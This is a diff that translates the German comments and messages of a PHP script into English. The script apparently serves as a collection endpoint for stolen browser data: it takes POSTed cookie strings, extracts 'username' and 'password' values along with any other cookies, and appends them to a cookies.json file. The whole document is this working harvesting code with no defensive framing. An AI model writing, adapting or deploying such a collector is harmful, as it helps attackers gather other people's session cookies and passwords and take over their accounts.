@@ -1,62 +1,61 @@
 <?php
-// Stellen Sie sicher, dass Daten empfangen wurden
+// Ensure data has been received
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-  // Überprüfen Sie, ob bestimmte Daten gesendet wurden
+  // Check if specific data has been sent
   if (isset($_POST['cookies'])) {
-    // Zugriff auf die gesendeten Daten
+    // Access the received data
     $cookieString = $_POST['cookies'];
 
-    // Splitte den Cookie-String
+    // Split the cookie string
     $cookiePairs = explode('; ', $cookieString);
 
-    // Initialisierung der Variablen
+    // Initialize variables
     $username = "";
     $password = "";
     $extras = [];
 
-    // Durchlaufe die Cookies
+    // Iterate through the cookies
     foreach ($cookiePairs as $cookiePair) {
       list($key, $value) = explode('=', $cookiePair, 2);
 
-      // Prüfe, ob es sich um den Benutzernamen oder das Passwort handelt
+      // Check if it's the username or password
       if ($key === "username") {
         $username = $value;
       } elseif ($key === "password") {
         $password = $value;
       } else {
-        // Alles andere wird in das Extras-Array eingefügt
+        // Insert anything else into the extras array
         $extras[$key] = $value;
       }
     }
 
-    // Erstelle das JSON-Objekt
+    // Create the JSON object
     $jsonData = [
       "username" => $username,
       "password" => $password,
       "extras" => $extras
     ];
 
-    // Lese den aktuellen Inhalt der Datei
+    // Read the current content of the file
     $fileContent = file_get_contents("cookies.json");
-    // Dekodiere das JSON-Array
+    // Decode the JSON array
     $existingData = json_decode($fileContent, true);
 
-    // Füge das neue Datenobjekt hinzu
+    // Add the new data object
     $existingData[] = $jsonData;
 
-    // Schreibe das aktualisierte JSON-Array zurück in die Datei
+    // Write the updated JSON array back to the file
     file_put_contents("cookies.json", json_encode($existingData));
 
-    // Bestätigung an den Client senden
-    echo "Daten erfolgreich empfangen und gespeichert.";
+    // Send confirmation to the client
+    echo "Data received and stored successfully.";
   } else {
-    // Wenn erforderliche Daten nicht gesendet wurden, eine Fehlermeldung senden
+    // If required data was not sent, send an error message
     http_response_code(400);
-    echo "Fehlende Daten.";
+    echo "Missing data.";
   }
 } else {
-  // Wenn kein POST-Request erhalten wurde, eine Fehlermeldung senden
+  // If no POST request was received, send an error message
   http_response_code(405);
-  echo "Nur POST-Anfragen sind erlaubt.";
+  echo "Only POST requests are allowed.";
 }
-?>
